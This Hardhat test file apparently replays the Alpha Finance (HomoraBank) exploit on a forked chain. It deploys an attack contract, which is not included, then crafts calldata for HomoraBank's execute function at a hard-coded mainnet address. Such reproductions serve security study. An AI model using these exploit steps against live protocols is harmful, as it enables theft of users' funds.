const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { parseUnits } = require("ethers/lib/utils");
const { ethers } = require("hardhat");

describe("Alpha Finance Attack", function () {
    let attack, homoraBank;

    const amount = parseUnits("1.5", 18);

    async function deployContractFixture() {
        // Contracts are deployed using the first signer/account by default
        const [attacker, ...addrs] = await ethers.getSigners();

        const Attack = await ethers.getContractFactory("Attack");
        attack = await Attack.deploy();

        homoraBank = await ethers.getContractAt("IHomoraBank", "0x5f5Cd91070960D13ee549C9CC47e7a4Cd00457bb");

        return { attacker, attack };
    }

    describe("Deployment", function () {
        before(async () => {
            await loadFixture(deployContractFixture);
        });

        it("step 2", async function () {
            await attack.attack2({ value: amount });
        });

        it("step 3", async function () {
            let bytes = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("execute3(uint256)"));
            let selector = bytes.slice(0, 10);

            let params = ethers.utils.defaultAbiCoder.encode(["uint"], [1000]);
            params = params.slice(2);

            let data = selector + params;

            await homoraBank.execute(0, attack.address, data);
        });

        // it("step 3", async function () {
        //     await attack.attack3();
        // });
    });
});
